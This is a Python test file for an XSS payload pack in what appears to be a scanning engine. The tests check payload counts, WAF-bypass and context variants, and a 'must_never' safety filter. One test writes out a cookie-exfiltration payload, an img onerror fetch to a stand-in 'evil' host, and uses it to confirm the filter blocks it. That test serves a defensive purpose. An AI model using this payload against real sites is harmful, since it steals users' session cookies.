from engine import payloads
from engine import xss_pack


def test_pack_registered():
    assert payloads.get("xss") is not None


def test_pack_has_90_plus_payloads():
    p = xss_pack.PACK
    total = (len(p.waf_safe) + len(p.waf_bypass)
             + sum(len(v) for v in p.context_variants.values()))
    assert total >= 90, "expected >= 90 payloads, got %d" % total


def test_expected_signal_present_for_all():
    p = xss_pack.PACK
    for _kind, payload in p.all_payloads():
        assert p.expected_signal.get(payload), (
            "missing expected_signal for %r" % payload)


def test_no_payload_violates_must_never():
    p = xss_pack.PACK
    for _kind, payload in p.all_payloads():
        assert not payloads.violates_must_never(payload, p), (
            "payload violates must_never: %r" % payload)


def test_exfil_blocked():
    assert payloads.violates_must_never(
        "<img src=x onerror=fetch('//evil/'+document.cookie)>", xss_pack.PACK)


def test_context_variants_present():
    p = xss_pack.PACK
    expected = {"html_body", "attribute", "quoted_attr_double",
                "quoted_attr_single", "js_string", "js_template",
                "html_comment", "srcdoc", "json_in_script"}
    assert expected <= set(p.context_variants.keys())


def test_payloads_for_context():
    for ctx in xss_pack.PACK.context_variants.keys():
        got = xss_pack.payloads_for_context(ctx, budget=3)
        assert got, "no payloads for context %r" % ctx
        assert len(got) <= 3
